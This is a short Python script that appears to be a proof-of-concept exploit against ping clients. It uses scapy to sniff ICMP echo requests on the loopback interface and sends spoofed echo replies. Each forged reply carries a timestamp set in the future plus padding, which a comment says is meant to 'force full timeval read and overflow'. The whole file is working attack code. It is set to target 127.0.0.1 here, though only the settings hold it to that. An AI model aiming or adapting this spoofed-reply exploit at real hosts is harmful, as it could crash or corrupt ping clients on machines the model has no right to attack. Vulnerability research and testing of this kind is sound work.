#!/usr/bin/env python3
from scapy.all import IP, ICMP, Raw, send, sniff, bind_layers
import time, struct, sys, os

LISTEN_INTERFACE = "lo"
TARGET_IP = "127.0.0.1"
FUTURE_OFFSET_SEC = 1.0

bind_layers(ICMP, Raw)

def process_packet(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(ICMP)):
        return
    ip = pkt[IP]
    ic = pkt[ICMP]
    if ic.type != 8:
        return

    fut = time.time() + FUTURE_OFFSET_SEC
    sec = int(fut)
    usec = int((fut - sec) * 1_000_000)

    data = struct.pack('=ll', sec, usec)
    data += b'Z'*20   # padding to force full timeval read and overflow

    reply = (
        IP(src=ip.dst, dst=ip.src) /
        ICMP(type=0, code=0, id=ic.id, seq=ic.seq) /
        Raw(load=data)
    )

    print(f"sending id={ic.id} seq={ic.seq} sec={sec} usec={usec} len={len(data)}")
    send(reply, iface=LISTEN_INTERFACE, verbose=False)


def main():
    if os.geteuid() != 0:
        sys.exit("need root")
    filt = f"icmp and icmp[icmptype] = icmp-echo and host {TARGET_IP}"
    print(f"listening on {LISTEN_INTERFACE} for {TARGET_IP}")
    sniff(iface=LISTEN_INTERFACE, filter=filt, prn=process_packet, store=0)

if __name__=='__main__':
    main()
